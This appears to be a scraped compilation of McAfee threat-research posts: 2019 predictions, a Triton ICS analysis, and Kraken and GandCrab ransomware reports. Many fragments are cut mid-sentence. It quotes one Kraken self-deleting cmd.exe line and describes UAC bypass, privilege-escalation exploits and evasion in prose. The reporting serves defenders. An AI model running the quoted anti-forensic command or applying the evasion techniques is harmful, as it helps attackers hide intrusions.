We expect to see an increase in underground discussions on mobile malware, mostly focused on Android, regarding botnets, banking fraud, ransomware, and bypassing two-factor authentication security. The value of exploiting the mobile platform is currently underestimated as phones offer a lot to cybercriminals given the amount of access they have to sensitive information such as bank accounts.
:\/:
Credit card fraud and the demand for stolen credit card details will continue, with an increased focus on online skimming operations that target third-party payment platforms on large e-commerce sites. From these sites, criminals can silently steal thousands of fresh credit cards details at a time. Furthermore, social media is being used to recruit unwitting users, who might not know they are working for criminals when they reship goods or provide financial services.
:\/:
We predict an increase in the market for stolen credentials—fueled by recent large data breaches and by bad password habits of users. The breaches lead, for example, to the sale of voter records and email-account hacking. These attacks occur daily.
:\/:
To increase their chances of success, attackers have long employed evasion techniques to bypass security measures and avoid detection and analysis. Packers, crypters, and other tools are common components of attackers’ arsenals. In fact, an entire underground economy has emerged, offering products and dedicated services to aid criminal activities. We predict in 2019, due to the ease with which criminals can now outsource key components of their attacks, evasion techniques will become more agile due to the application of artificial intelligence. Think the counter-AV industry is pervasive now? This is just the beginning.
:\/:
 by the RigExploit Kit. By adding technologies such as artificial intelligence, evasion techniques will be able to further circumvent protections.
:\/:
In 2018, we observed the emergence of new threats such as cryptocurrency miners, which hijack the resources of infected machines. With each threat comes inventive evasion techniques:
:\/:
 which simply stops its mining process when the victim runs the Task Manager or an antimalware scan.
:\/:
Exploit kits: Popular evasion techniques include process injection or the manipulation of memory space and adding arbitrary code. In-memory injection is a popular infection vector for avoiding detection during delivery.
:\/:
Botnets: Code obfuscation or anti-disassembling techniques are often used by large botnets that infect thousands of victims. In May 2018, AdvisorsBot was discovered using junk code, fake conditional instructions, XOR encryption, and even API hashing. Because bots tend to spread widely, the authors implemented many evasion techniques to slow reverse engineering. They also used obfuscation mechanisms for communications between the bots and control servers. Criminals use botnets for activities such as DDOS for hire, proxies, spam, or other malware delivery. Using evasion techniques is critical for criminals to avoid or delay botnet takedowns.
:\/:
Advanced persistent threats: Stolen certificates bought on the cybercriminal underground are often used in targeted attacks to bypass antimalware detection. Attackers also use low-level malware such as rootkits or firmware-based threats. For example, in 2018 ESET discovered the first UEFI rootkit, LoJax. Security researchers have also seen destructive features used as anti-forensic techniques: The OlympicDestroyer malware targeted the Olympic Games organization and erased event logs and backups to avoid investigation.
:\/:
In recent years, we have seen malware using evasion techniques to bypass machine learning engines. For example, in 2017 the Cerber ransomware dropped legitimate files on systems to trick the engine that classifies files. In 2018, PyLocky ransomware used InnoSetup to package the malware and avoid machine learning detection.
:\/:
Clearly, bypassing artificial intelligence engines is already on the criminal to-do list; however, criminals can also implement artificial intelligence in their malicious software. We expect evasion techniques to begin leveraging artificial intelligence to automate target selection, or to check infected environments before deploying later stages and avoiding detection.
:\/:
Such implementation is game changing in the threat landscape. We predict it will soon be found in the wild.
:\/:
 and finding new vulnerabilities to exploit. We also noticed fileless and “living off the land” threats are more slippery and evasive than ever, and we have even seen the incubation of steganography malware in the 
:\/:
. In 2019, we predict attackers will more frequently combine these tactics to create multifaced, or synergistic, threats.
:\/:
Attacks are usually centered on the use of one threat. Bad actors concentrate their efforts on iterating and evolving one threat at a time for effectiveness and evasion. When an attack is successful, it is classified as ransomware, cryptojacking, data exfiltration, etc., and defenses are put in place. At this point, the attack’s success rate is significantly reduced. However, if a sophisticated attack involves not one but five top-notch threats synergistically working together, the defense panorama could become very blurry. The challenge arises when an attempt is made to identify and mitigate the attack. Because the ultimate attack goals are unknown, one might get lost in the details of each threat as it plays a role in the chain.
:\/:
One of the reasons synergic threats are becoming a reality is because bad actors are improving their skills by 
:\/:
. As attackers organize their efforts into a black-market business model, they can focus on adding value to previous building blocks. This strategy allows them to orchestrate multiple threats instead of just one to reach their goals.
:\/:
Imagine an attack that starts with a phishing threat—not a typical campaign using Word documents, but a novel technique. This phishing email contains a video attachment. When you open the video, your video player does not play and prompts you to update the codec. Once you run the update, a steganographic polyglot file (a simple GIF) is deployed on your system. Because it is a polyglot (a file that conforms to more than one format at the same time), the GIF file schedules a task that fetches a fileless script hosted on a compromised system. That script running in memory evaluates your system and decides to run either ransomware or a cryptocurrency miner. That is a dangerous synergistic threat in action.
:\/:
The attack raises many questions: What are you dealing with? Is it phishing 2.0? Is it stegware? Is it fileless and “living off the land”? Cryptojacking? Ransomware? It is everything at the same time.
:\/:
This sophisticated but feasible example demonstrates that focusing on one threat may not be enough to detect or remediate an attack. When you aim to classify the attack into a single category, you might lose the big picture and thus be less effective mitigating it. Even if you stop the attack in the middle of the chain, discovering the initial and final stages is as important for protecting against future attempts.
:\/:
Tackling sophisticated attacks based on synergic threats requires questioning every threat. What if this ransomware hit was part of something bigger? What if this phishing email pivots to a technique that employees are not trained for? What if we are missing the real goal of the attack?
:\/:
Bearing these questions in mind will not only help capture the big picture, but also get the most of security solutions. We predict bad actors will add synergy to their attacks, but cyber defenses can also work synergistically.
:\/:
Cybercriminals to Use Social Media Misinformation, Extortion Campaigns to Challenge Organizations’ Brands
:\/:
The elections were influenced, fake news prevails, and our social media followers are all foreign government–controlled bots. At least that’s how the world feels sometimes. To say recent years have been troubled for social media companies would be an understatement. During this period a game of cat and mouse has ensued, as automated accounts are taken down, adversaries tactics evolve, and botnet accounts emerge looking more legitimate than ever before. In 2019, we predict an increase of misinformation and extortion campaigns via social media that will focus on brands and originate not from nation-state actors but from criminal groups.
:\/:
Nation-states leverage bot battalions to deliver messages or manipulate opinion, and their effectiveness is striking. Bots often will take both sides of a story to spur debate, and this tactic works. By employing a system of amplifying nodes, as well as testing the messaging (including hashtags) to determine success rates, botnet operators demonstrate a real understanding of how to mold popular opinion on critical issues.
:\/:
In one example, an account that was only two weeks old with 279 followers, most of which were other bots, began a harassment campaign against an organization. By amplification, the account generated an additional 1,500 followers in only four weeks by simply tweeting malicious content about their target.
:\/:
Activities to manipulate public opinion have been well documented and bots well versed in manipulating conversations to drive agendas stand ready. Next year we expect that cybercriminals will repurpose these campaigns to extort companies by threatening to damage their brands. Organizations face a serious danger.
:\/:
In the past two years, enterprises have widely adopted the Software-as-a-Service model, such as Office 365, as well as Infrastructure- and Platform-as-a-Service cloud models, such as AWS and Azure. With this move, far more corporate data now resides in the cloud. In 2019, we expect a significant increase in attacks that follow the data to the cloud.
:\/:
With the increased adoption of Office 365, we have noticed a surge of attacks on the service— especially attempts to compromise email. One threat the McAfee cloud team uncovered was the botnet 
:\/:
 which targeted system accounts that typically do not have multifactor authentication. We have also seen the emergence of exploits of the trust model in the Open Authorization standard. One was launched by Fancy Bear, the Russian cyber espionage group, phishing users with a fake Google security app to gain access to user data.
:\/:
Similarly, during the last couple of years we have seen many high-profile data breaches attributed to misconfigured Amazon S3 buckets. This is clearly not the fault of AWS. Based on the shared responsibility model, the customer is on the hook to properly configure IaaS/PaaS infrastructure and properly protect their enterprise data and user access. Complicating matters, many of these misconfigured buckets are owned by vendors in their supply chains, rather than by the target enterprises. With access to thousands of open buckets and credentials, bad actors are increasingly opting for these easy pickings.
:\/:
McAfee has found that 21% of data in the cloud is sensitive—such as intellectual property, and customer and personal data—according to the 
:\/:
 With a 33% increase in users collaborating on this data during the past year, cybercriminals know how to seek more targets:
:\/:
Cloud-native attacks targeting weak APIs or ungoverned API endpoints to gain access to the data in SaaS as well as in PaaS and serverless workloads
:\/:
Expanded reconnaissance and exfiltration of data in cloud databases (PaaS or custom applications deployed in IaaS) expanding the S3 exfiltration vector to structured data in databases or data lakes
:\/:
 which exploits publicly writable S3 buckets introduced due to customer misconfigurations) to launch cryptojacking or ransomware attacks into other variants of MITM attacks.
:\/:
As tech fans continue to fill their homes with smart gadgets, from plugs to TVs, coffee makers to refrigerators, and motion sensors to lighting, the means of gaining entry to a home network are growing rapidly, especially given how poorly secured many IoT devices remain.
:\/:
But the real key to the network door next year will be the voice-controlled digital assistant, a device created in part to manage all the IoT devices within a home. As sales increase—and an explosion in adoption over the holiday season looks likely—the attraction for cybercriminals to use assistants to jump to the really interesting devices on a network will only continue to grow.
:\/:
For now, the voice assistant market is still taking shape, with many brands still looking to dominate the market, in more ways than one, and it is unclear whether one device will become ubiquitous. If one does take the lead, its security features will quite rightly fall under the microscope of the media, though not perhaps before its privacy concerns have been fully examined in prose.
:\/:
(Last year we highlighted privacy as the key concern for home IoT devices. Privacy will continue to be a concern, but cybercriminals will put more effort into building botnets, demanding ransoms, and threatening the destruction of property of both homes and businesses).
:\/:
This opportunity to control a home’s or office’s devices will not go unnoticed by cybercriminals, who will engage in an altogether different type of writing in relation to the market winner, in the form of malicious code designed to attack not only IoT devices but also the digital assistants that are given so much license to talk to them.
:\/:
Smartphones have already served as the door to a threat. In 2019, they may well become the picklock that opens a much larger door. We have already seen two threats that demonstrate what cybercriminals can do with unprotected devices, in the form of the 
:\/:
 in 2017. These IoT malware appeared in many variants to attack connected devices such as routers, network video recorders, and IP cameras. They expanded their reach by password cracking and exploiting known vulnerabilities to build worldwide robot networks.
:\/:
Next year we expect to see two main vectors for attacking home IoT devices: routers and smartphones/ tablets. The Mirai botnet demonstrated the lack of security in routers. Infected smartphones, which can already monitor and control home devices, will become one of the top targets of cybercriminals, who will employ current and new techniques to take control.
:\/:
Malware authors will take advantage of phones and tablets, those already trusted controllers, to try to take over IoT devices by password cracking and exploiting vulnerabilities. These attacks will not appear suspicious because the network traffic comes from a trusted device. The success rate of attacks will increase, and the attack routes will be difficult to identify. An infected smartphone could cause the next example of 
:\/:
. Vulnerabilities in mobile and cloud apps are also ripe for exploitation, with smartphones at the core of the criminals’ strategy.
:\/:
Infected IoT devices will supply botnets, which can launch DDoS attacks, as well as steal personal data. The more sophisticated IoT malware will exploit voice-controlled digital assistants to hide its suspicious activities from users and home-network security software. Malicious activities such as opening doors and connecting to control servers could be triggered by user voice commands (“Play music” and “What is today’s weather?”). Soon we may hear infected IoT devices themselves exclaiming: “Assistant! Open the back door!”
:\/:
Large-scale data breaches of identity platforms—which offer centralized secure authentication and authorization of users, devices, and services across IT environments—have been well documented in 2018. Meanwhile, the captured data is being reused to cause further misery for its victims. In 2019, we expect to see large-scale social media platforms implement additional measures to protect customer information. However, as the platforms grow in numbers, we predict criminals will further focus their resources on such attractive, data-rich environments. The struggle between criminals and big-scale platforms will be the next big battleground.
:\/:
 that attacks industrial control systems (ICS), has demonstrated the capabilities of adversaries to remotely target manufacturing environments through their adjacent IT environments. Identity platform and “edge device” breaches will provide the keys to adversaries to launch future remote ICS attacks due to static password use across environments and constrained edge devices, which lack secure system requirements due to design limitations. (An edge device is any network-enabled system hardware or protocol within an IoT product.) We expect multifactor authentication and identity intelligence will become the best methods to provide security in this escalating battle. We also predict identity intelligence will complement multifactor authentication to strengthen the capabilities of identity platforms.
:\/:
Identity is a fundamental component in securing IoT. In these ecosystems, devices and services must securely identify trusted devices so that they can ignore the rest. The identity model has shifted from user centric in traditional IT systems to machine centric for IoT systems. Unfortunately, due to the integration of operational technology and insecure “edge device” design, the IoT trust model is built on a weak foundation of assumed trust and perimeter-based security.
:\/:
At Black Hat USA and DEF CON 2018, 30 talks discussed IoT edge device exploitation. That’s a large increase from just 19 talks on the topic in 2017. The increase in interest was primarily in relation to ICS, consumer, medical, and “smart city” verticals. (See Figure 1.) Smart edge devices, combined with high-speed connectivity, are enabling IoT ecosystems, but the rate at which they are advancing is compromising the security of these systems.
:\/:
Figure 1: The number of conference sessions on the security of IoT devices has increased, matching the growing threat to poorly protected devices.
:\/:
Most IoT edge devices provide no self-defense (isolating critical functions, memory protection, firmware protection, least privileges, or security by default) so one successful exploit owns the device. IoT edge devices also suffer from “break once, run everywhere” attacks—due to insecure components used across many device types and verticals. (See articles on 
:\/:
 due to assumed trust. These examples illustrate just a few of many possible scenarios that lead us to believe adversaries will choose IoT edge devices as the path of least resistance to achieve their objectives. Servers have been hardened over the last decade, but IoT hardware is far behind. By understanding an adversary’s motives and opportunities (attack surface and access capability), we can define a set of security requirements independent of a specific attack vector.
:\/:
Figure 2 gives a breakdown of the types of vulnerabilities in IoT edge devices, highlighting weak points to address by building identity and integrity capabilities into edge hardware to ensure these devices can deflect attacks.
:\/:
IoT security must begin on the edge with a zero-trust model and provide a hardware root of trust as the core building block for protecting against 
:\/:
 and other threats. McAfee predicts an increase in compromises on identity platforms and IoT edge devices in 2019 due to the adoption of smart cities and increased ICS activity.
:\/:
 in 2010, is a serious threat. This class of cyber sabotage can spy on, disrupt, or destroy systems that manage large-scale industrial processes. An essential danger in this threat is that it moves from mere digital damage to risking human lives. In this post we will review the history of ICS malware, briefly examine how one ICS framework operates, and offer our advice on how to fight such threats.
:\/:
ICS malware is usually sophisticated, requiring time to research its targets and sufficient resources. Attackers can be motivated by financial gain, hacktivism, or espionage, as well as for political ends, as we saw with Stuxnet. Since Stuxnet, researchers have discovered several industrial attacks; each year we seem to read about a worse threat than before.
:\/:
In August 2017, a sophisticated malware targeted petrochemical facilities in the Middle East. The malware—dubbed Triton, Trisis, or HatMan—attacked safety instrumented systems (SIS), a critical component that has been designed to protect human life. The system targeted in that case was the Schneider Triconex SIS. The initial vector of infection is still unknown, but it was likely a phishing attack.
:\/:
After gaining remote access, the Triton attackers moved to disrupt, take down, or destroy the industrial process. The goal of the attackers is still unclear because the attack was discovered after an 
:\/:
 of the plant led to further investigation. Investigations conducted by several security companies have revealed a complex malware framework embedding PowerPC shellcode (the Triconex architecture) and an implementation of the proprietary communication protocol TriStation. The malware allowed the attackers to easily communicate with safety controllers and remotely manipulate system memory to inject shellcodes; they completely controlled the target. However, because the attack did not succeed it is possible that a payload, the final stage of the attack, was missing. All investigations pointed in this direction. If the final payload had been delivered, the consequences could have been disastrous.
:\/:
In 2010, Stuxnet was one of the most sophisticated ICS threats discovered. This cyber weapon was created to target Iranian centrifuges. It was able to reprogram a particular programmable logic controller to change the speed of centrifuge rotations. The goal of Stuxnet was not to destroy but to take the control of the industrial process.
:\/:
In 2013, the malware Havex targeted energy grids, electricity firms, and many others. The attackers collected a large amount of data and remotely monitored industrial systems. Havex was created for espionage and sabotage.
:\/:
BlackEnergy was discovered in 2015. It targeted critical infrastructure and destroyed files stored on workstations and servers. In Ukraine, 230,000 people were left in the dark for six hours after hackers compromised several power distribution centers.
:\/:
In 2015, IronGate was discovered on public sources. It targeted Siemens control systems and had functionalities similar to Stuxnet’s. It is unclear if this was a proof of concept or a simple penetration-testing tool.
:\/:
Industroyer hit Ukraine again in 2016. The malware embedded a data wiper component as well as a distributed denial of services module. It was crafted for destruction. The attack caused a second shutdown of Ukraine’s power grid.
:\/:
In 2017, Triton was discovered. The attack did not succeed; the consequences could have been disastrous.
:\/:
ICS malware are critical because they infect industrial devices and automation. However, regular malware can also impact industrial process. Last year WannaCry forced several companies, from medical to automobile industries, to stop production. Some months later NotPetya hit nuclear power plants, power grids, and health care systems. In 2018, a cryptocurrency miner struck a water utility in Europe.
:\/:
Triton targeted the Triconex safety controller, distributed by Schneider Electric. Triconex safety controllers are used in 18,000 plants (nuclear, oil and gas refineries, chemical plants, etc.), according to the company. Attacks on SIS require a high level of process comprehension (by analyzing acquired documents, diagrams, device configurations, and network traffic). SIS are the last protection against a physical incident.
:\/:
The attackers gained access to the network probably via spear phishing, according to an investigation. After the initial infection, the attackers moved onto the main network to reach the ICS network and target SIS controllers.
:\/:
To communicate with SIS controllers, attackers recoded the proprietary TriStation communication protocol on port UDP/1502. This step suggests they invested the time to reverse engineer the Triconex product.
:\/:
 that is very handy for analyzing the TriStation protocol and detecting a Triton attack. The following screenshot shows an example of the information returned by the Triconex SIS. Triton requires the “running state” of the controller to perform the next stages of the attack.
:\/:
In the preceding screen Triconex replies to the request “Get Control Program Status,” which is sent by Triton.
:\/:
The Triton framework (dc81f383624955e0c0441734f9f1dabfe03f373c) posed as the legitimate executable trilog.exe, which collects logs. The executable is a python script compiled in an exe. The framework also contains library.zip (1dd89871c4f8eca7a42642bf4c5ec2aa7688fd5c), which contains all the python scripts required by Triton. Finally, two PowerPC shellcodes (the target architecture) are used to compromise the controllers. The first PowerPC shellcode is an injector (inject.bin, f403292f6cb315c84f84f6c51490e2e8cd03c686) used to inject the second stage (imain.bin, b47ad4840089247b058121e95732beb82e6311d0), the backdoor that allows read, write, and execute access on the Triconex product.
:\/:
The missing payload has not been recovered during the forensic investigation. Because the attack was discovered early, it is possible that the attackers did not have time to launch the final stage.
:\/:
 that simulates a Triconex safety controller. We modified this script with a Raspberry Pi to create a cheap detector tool.
:\/:
This inexpensive tool can be easily installed on an ICS network. If an illegitimate connection occurs, the device alerts with a blinking LED and siren. It also displays the IP address of the connection for further investigation.
:\/:
ICS malware has become more aggressive and sophisticated. Many industrial devices were built before anyone imagined cyberattacks such as Triton. ICS’s are now exposed to connected environments they were not designed for.
:\/:
Standard McAfee security recommendations (vulnerability patching, complex passwords, identification control, security tools, etc.) remain the same as for regular networks, yet industrial systems also require specific procedures due to their importance. Industrial networks must be segregated from general business networks, and every machine connected to the industrial process should be carefully monitored by using strict access control and application whitelisting.
:\/:
Segregate physical and logical access to ICS networks with strong authentication, including strong passwords and double factor, card readers, surveillance cameras, etc.
:\/:
Use DMZ and firewall to prevent network traffic from passing between the corporate and the ICS network
:\/:
Deploy strong security measures on the ICS network perimeter, including patch management, disabling unused ports, and restricting ICS user privileges
:\/:
Develop strong security policies and an incident response plan to restore systems during an incident
:\/:
Attackers learn what works from past attacks and from each other. Rapid developments in ICS threats make it crucial to stay protected. Manufacturers, plant operators, governments, and the cybersecurity industry must work together to avoid critical cyberattacks.

Rising from the deep, Kraken Cryptor ransomware has had a notable development path in recent months. The first signs of Kraken came in mid-August on a popular underground forum. In mid-September it 
:\/:
 that the malware developer had placed the ransomware, masquerading as a security solution, on the website SuperAntiSpyware, infecting systems that tried to download a legitimate version of the antispyware software.
:\/:
The McAfee Advanced Threat Research team, working with the Insikt group from Recorded Future, found evidence of the Kraken authors asking the Fallout team to be added to the Exploit Kit. With this partnership, Kraken now has an additional malware delivery method for its criminal customers.
:\/:
We also found that the user associated with Kraken ransomware, ThisWasKraken, has a paid account. Paid accounts are not uncommon on underground forums, but usually malware developers who offer services such as 
:\/:
 are highly trusted members and are vetted by other high-level forum members. Members with paid accounts are generally distrusted by the community.
:\/:
Uses a hybrid combination of encryption algorithms (AES, RC4, Salsa20) for secure and fast encryption with a unique key for each file
:\/:
Enables the use of a network resource and adds an expansion bypass mode for encrypting all files on non-OS disks
:\/:
Kraken works with an affiliate program, as do ransomware families such as GandCrab. This business scheme is often referred to a Ransomware-as-a-Service (RaaS).
:\/:
Affiliates are given a new build of Kraken every 15 days to keep the payload fully undetectable from antimalware products. According to ThisWasKraken, when a victim asks for a free decryption test, the affiliate member should send one of the victim’s files with its associated unique key to the Kraken Cryptor ransomware support service. The service will decrypt the file and resend it to the affiliate member to forward the victim. After the victim pays the full ransom, the affiliate member sends a percentage of the received payment to the RaaS developers to get a decryptor key, which is forwarded to the victim. This system ensures the affiliate pays a percentage to the affiliate program and does not simply pocket the full amount. The cut for the developers offers them a relatively safe way of making a profit without exposing themselves to the risk of spreading ransomware.
:\/:
We have observed that the profit percentage for the developers has decreased from 25% in Version 1 to 20% in Version 2. The developers might have done this to attract more affiliates. To enter the program, potential affiliates must complete a form and pay $50 to be accepted.
:\/:
On October 21, Kraken’s authors released Version 2 of the affiliate program, reflecting the ransomware’s popularity and a fresh release. At the same time, the authors published a map showing the distribution of their victims:
:\/:
The first public release of Kraken Cryptor was Version 1.2; the latest is Version 2.07. To promote the ransomware, the authors created a video showing its capabilities to potential customers. We analyzed the metadata of the video and believe the authors created it along with the first version, released in August.
:\/:
The Advanced Threat Research team and Recorded Future’s Insikt group analyzed all the forum messages posted by ThisWasKraken. Based on the Russian language used in the posts, we believe ThisWasKraken is neither a native Russian nor English speaker. To make forum posts in Russian, the actor likely uses an automated translation service, suggested by the awkward phrasing indicative of such a service. In contrast, the actor is noticeably more proficient in English, though they make mistakes consistently in both sentence structure and spelling. English spelling errors are also noticeable in the ransom note.
:\/:
ThisWasKraken is likely part of a team that is not directly involved in the development of the ransomware. The actor’s role is customer facing, through the Jabber account thiswaskraken@exploit[.]im. Communications with ThisWasKraken show that the actor refers all technical issues to the product support team at teamxsupport@protonmail[.]com.
:\/:
Bitcoin is the only currency the affiliate program uses. Insikt Group identified several wallets associated with the operation. Kraken’s developers appear to have choose BitcoinPenguin, an online gambling site as the primary money laundering conduit. It is very uncommon for criminal actors, and specifically ransomware operators, to bypass traditional cryptocurrency exchangers when laundering stolen funds. One of the decisive factors for the unusual choice was likely BitcoinPenguin’s lack of requiring identity verification by its members, allowing anyone to maintain an anonymous cryptocurrency wallet.
:\/:
Although in response to regulatory demands cryptocurrency exchangers continue to stiffen their registration rules, online crypto casinos do not have to follow the same know-your-customer guidelines, providing a convenient loophole for all kinds of money launderers.
:\/:
Bitcoin transactions associated with Kraken analyzed with the Crystal blockchain tool. The parent Bitcoin wallet is 3MsZjBte81dvSukeNHjmEGxKSv6YWZpphH.
:\/:
The ransomware encrypts data on the disk very quickly and uses external tools, such as SDelete from the Sysinternals suite, to wipe files and make file recovery harder.
:\/:
The ransomware has implemented a user account control (UAC) bypass using the Windows Event Viewer. This bypass technique is used by other malware families and is quite effective for executing malware.
:\/:
We analyzed an early subset of Kraken ransomware samples and determined they were still in the testing phase, adding and removing options. The ransomware has implemented a “protection” to delete itself during the infection phase:
:\/:
“C:\Windows\System32\cmd.exe” /C ping 127.0.0.1 -n 3 > NUL&&del /Q /F /S “C:\Users\Administrator\AppData\Local\Temp\krakentemp0000.exe”
:\/:
This step is to prevent researchers and endpoint protections from catching the file on an infected machine.
:\/:
Kraken encrypts user files with a random name and drops the ransom note demanding the victim to pay to recover them. McAfee recommends not paying ransoms because doing so contributes to the development of more ransomware families.
:\/:
Each file extension is different; this technique is often used by specific ransomware families to bypass endpoint protection systems.
:\/:
Kraken delivered by the exploit kit bypasses the UAC using Event Viewer, drops a file on the system, and executes it through the UAC bypass method.
:\/:
The authors of the binary forgot during the compilation of the first versions to delete the PDB reference, revealing that the file has a relationship with Kraken Cryptor:
:\/:
One unique feature of this ransomware family is the use of SDelete. Kraken uses a .bat file to perform certain operations, making file recovery much more challenging:
:\/:
Kraken downloads SDelete from the Sysinternals website, adds the registry key accepting the EULA to avoid the pop-up, and executes it with the following arguments:
:\/:
The SDelete batch file makes file recovery much harder by overwriting all free space on the drive with zeros, deleting the Volume Shadow Copies, disabling the recovery reboot option and finally rebooting the system after 300 seconds.
:\/:
The earlier versions of Kraken were delivered by a loader before it moved to a direct execution method. The loader we examined contained a specific netguid. With this, we found additional samples of the Kraken loader on VirusTotal:
:\/:
Not only the loader had a specific netguid but the compiled versions of Kraken also shared a netguid, making it possible to continue hunting samples:
:\/:
Kraken uses a configuration file in every version to set the variables for the ransomware. This file is easily extracted for additional analysis.
:\/:
By extracting the config files from all the versions, we built the following overview of features. (The √ means the feature is present.)
:\/:
All the versions we examined mostly contain the same options, changing only in some of them the antivirtual protection and antiforensic capabilities. The latest version, Kraken 2.0.7, changed its configuration scheme. We will cover that later in this article.
:\/:
Other differences in Kraken’s config file include the list of countries excluded from encryption. The standouts are Brazil and Syria, which were not named in the original forum advertisement.
:\/:
Having an exclusion list is a common method of cybercriminals to avoid prosecution. Brazil’s addition to the list in Version 1.5 suggests the involvement of a Brazilian affiliate. The following table shows the exclusion list by country and version. (The √ means the country appears on the list.)
:\/:
Regarding Syria: We believe that the Kraken actors have had the same change of heart as the actors behind GandCrab, who recently released decryption keys for Syrian victims after a tweet claimed they had no money to pay the ransoms.
:\/:
This release has more options. We expect this malware will be more configurable than other active versions.
:\/:
In Versions 1.2 through 2.04 Kraken contacts blasze[.]tk to download additional files. The site has Cloudflare protection to mitigate against DDoS attacks:
:\/:
The McAfee Advanced Threat Research team created Yara rules to detect the Kraken ransomware. The rules are available 
:\/:
A wall eight feet high with three strands of barbed wire is considered sufficient to deter a determined intruder, at least according to the advice offered by the CISSP professional certification. Although physical controls can be part of a multifaceted defense, an electronic attack affords the adversary time to develop the necessary tools to bypass any logical wall set before them. In the latest findings from the McAfee Advanced Threat Research team, we examine an adversary that was not content with a single campaign, but launched five distinct waves adapted to their separate targets. The new report 
:\/:
“Operation Oceansalt Attacks South Korea, U.S., and Canada with Source Code from Chinese Hacker Group”
:\/:
 analyzes these waves and their victims, primarily in South Korea but with a few in the United States and Canada.
:\/:
Although one reaction is to marvel at the level of innovation displayed by the threat actor(s), we are not discussing five new, never-before-seen malware variants—rather the reuse of code from implants seen eight years prior. The Oceansalt malware uses large parts of code from the Seasalt implant, which was linked to the Chinese hacking group Comment Crew. The level of reuse is graphically depicted below:
:\/:
Originally taking the title APT1, the Comment Crew was seen as the threat actor conducting offensive cyber operations against the United States almost 10 years before. The obvious suspect is Comment Crew and, although this may seem a logical conclusion, we have not seen any activity from this group since they were initially exposed. Is it possible that this group has returned and, if so, why target South Korea?
:\/:
It is possible that the source code developed by Comment Crew has now been used by another adversary. The code to our knowledge, however, has never been made public. Alternatively, this could be a “false flag” operation to suggest that we are seeing the re-emergence of Comment Crew. Creating false flags is a common practice.
:\/:
It is likely that reactions to this research will focus on debating the identity of the threat actor. Although this question is of great interest, answering it will require more than the technical evidence that private industry can provide. These limitations are frustrating. However, we can focus on the indicators of compromise presented in this report to detect, correct, and protect our systems, regardless of the source of these attacks.
:\/:
Perhaps more important is the possible return of a previously dormant threat actor and, further, why should this campaign occur now? Regardless of whether this is a false flag operation to suggest the rebirth of Comment Crew, the impact of the attack is unknown. However, one thing is certain. Threat actors have a wealth of code available to leverage new campaigns, as 
:\/:
 from the Advanced Threat Research team has revealed. In this case we see that collaboration not within a group but potentially with another threat actor—offering up considerably more malicious assets. We often talk about partnerships within the private and public sector as the key to tackling the cybersecurity challenges facing society. The bad actors are not putting these initiatives on PowerPoint slides and marketing material; they are demonstrating that partnerships can suit their ends, too.
:\/:
The GandCrab ransomware, which first appeared in January, has been updated rapidly during its short life, with Version 5.0.2 appearing this month. In this post we will examine the latest version and how the authors have improved the code (and in some cases have made mistakes). McAfee gateway and endpoint products are able to protect customers from known variants of this threat.
:\/:
The GandCrab authors have moved quickly to improve the code and have added comments to provoke the security community, law enforcement agencies, and the 
:\/:
 organization. Despite the agile approach of the developers, the coding is not professional and bugs usually remain in the malware (even in Version 5.0.2), but the speed of change is impressive and increases the difficulty of combating it.
:\/:
The group behind GandCrab has achieved cult status in underground forums; the authors are undoubtedly confident and have strong marketing skills, but flawless programming is not one of their strengths.
:\/:
On September 27, the GandCrab crew announced Version 5 with the same showmanship as its earlier versions. GandCrab ransomware has gained a lot of attention from security researchers as well as the underground. The developers market the affiliate program like a “members-only club” and new affiliates are lining up to join, in the hope of making easy money through the large-scale ransomware extortion scheme.
:\/:
The prospect of making money not only attracts new affiliates, but also leads to the formation of new alliances between GandCrab and other criminal services that strengthen the malware’s supply and distribution networks. One of these alliances became obvious during Version 4, in which the ransomware started being distributed through the new Fallout exploit kit. This alliance was again emphasized in the GandCrab Version 5 announcement, as the GandCrab crew openly endorsed FalloutEK.
:\/:
With Version 5, yet another alliance with a criminal service has been formed. The malware crypter service NTCrypt announced that it is partnering with the GandCrab crew. A crypter service provides malware obfuscation to evade antimalware security products.
:\/:
The partnership between GandCrab and NTCrypt was established in a novel way. At the end of September, the GandCrab crew started a “crypt competition” on a popular underground forum to find a new crypter service they could partner with. NTCrypt applied and eventually won the competition.
:\/:
This novel approach emphasizes once more the cult status GandCrab has in the underground community. For a criminal business such as GandCrab, building these alliances makes perfect sense: They increase the ease of operation and a trusted affiliate network minimizes their risk exposure by allowing them to avoid less-trusted suppliers and distributors.
:\/:
For the security community it is worrisome to see that GandCrab’s aggressive marketing strategy seems to be paying off. It is generating a strong influx of criminal interest and allows the GandCrab crew to form alliances with other essential services in the cybercriminal supply chain.
:\/:
GandCrab Version 5 uses several mechanisms to infect systems. The following diagram shows an overview of GandCrab’s behavior.
:\/:
PowerShell scripts or within the memory of the PowerShell process (the later mainly in Version 5.0.2)
:\/:
, is to encrypt all or many files on an infected system and insist on payment to unlock them. The developer requires payment in cryptocurrency, primarily Dash (or Bitcoin in some older versions), because it is complex to track and quick to receive the payment.
:\/:
The malware is usually, but not always, packed. We have seen variants in .exe format (the primary form) along with DLLs. GandCrab is effectively ransomware as a service; its operators can choose which version they want.
:\/:
This version has two releases. The first works only on Windows 7 or later due to a big mistake in the compiling time. Version 5.0 carries two exploits that try to elevate privileges. It checks the version of the operating system and the TokenIntegrityLevel class of the process. If the SID Subauthority is SECURITY_MANDATORY_LOW_RID (0x1000), it tries to execute the exploits if it also passed one previous check of a mutex value.
:\/:
One release is the exploit released in August on Twitter and GitHub by the hacker “SandboxEscaper.” The Twitter handle for this hacker is 
:\/:
This exploit tries to use a problem with the Task System in Windows when the operating system improperly handles calls to an advanced local procedure call.
:\/:
The GandCrab authors claim there is no CVE of this exploit, but that is incorrect. It falls under CVE-2018-8440. This exploit can affect versions Windows 7 through Windows 10 Server. More information about this exploit can be found 
:\/:
In the first release of Version 5.0, the malware authors wrote the code exploit using normal calls to the functions. Thus at compiling time the binary has the IAT filled with the DLL needed for some calls. This DLL does not exist in Windows Vista and XP, so the malware fails to run in these systems, showing an error.
:\/:
This release published an HTML file after encrypting the user’s files, but this file was faulty because it did not always have the information needed to decrypt the user’s files.
:\/:
The second release uses dynamic calls and obfuscates the strings of the exploit, as shown in the previous image. (Earlier they were in plain text.)
:\/:
The second exploit is covered under CVE-2018-8120, which in Windows 7, Windows Server 2008 R2 and Windows Server 2008 allows an elevation of privileges from the kernel. Thanks to a faulty object in the token of the System process, changing this token in the malware results in executing the malware with System privileges.
:\/:
The malware checks the version of the operating system and type of user and whether it can get the token elevation information of its own process before employing the use of exploits. In some cases, it fails to infect. For example, in Windows XP the second release of Version 5 runs but does not encrypt the files. (We thank fellow researcher 
:\/:
